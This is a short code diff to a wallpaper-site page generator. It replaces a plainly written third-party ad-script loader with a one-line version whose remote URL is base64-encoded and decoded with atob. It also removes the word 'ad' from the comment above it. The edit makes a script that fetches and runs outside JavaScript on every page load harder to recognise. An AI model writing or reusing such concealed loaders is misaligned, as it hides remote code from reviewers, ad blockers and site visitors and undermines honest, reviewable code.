@@ -131,20 +131,11 @@ def generate_individual_pages(wallpapers):
     </div>
   </main>
 
-  <!-- Banner ad placement at the bottom -->
+  <!-- Banner placement -->
   <div class="ad-banner-wrapper">
     <div id="container-e02b2bad74f57baf7d09e50da61b9158"></div>
     <script>
-      (function() {{
-        const p1 = 'https://pl29642773';
-        const p2 = '.effectivecpm';
-        const p3 = 'network.com/e02b2bad74f57baf7d09e50da61b9158/invoke.js';
-        const s = document.createElement('script');
-        s.async = true;
-        s.setAttribute('data-cfasync', 'false');
-        s.src = p1 + p2 + p3;
-        document.head.appendChild(s);
-      }})();
+      (function(){{var s=document.createElement('script');s.async=true;s.src=atob('aHR0cHM6Ly9wbDI5NjQyNzczLmVmZmVjdGl2ZWNwbW5ldHdvcmsuY29tL2UwMmIyYmFkNzRmNTdiYWY3ZDA5ZTUwZGE2MWI5MTU4L2ludm9rZS5qcw==');document.head.appendChild(s);}})();
     </script>
   </div>
 
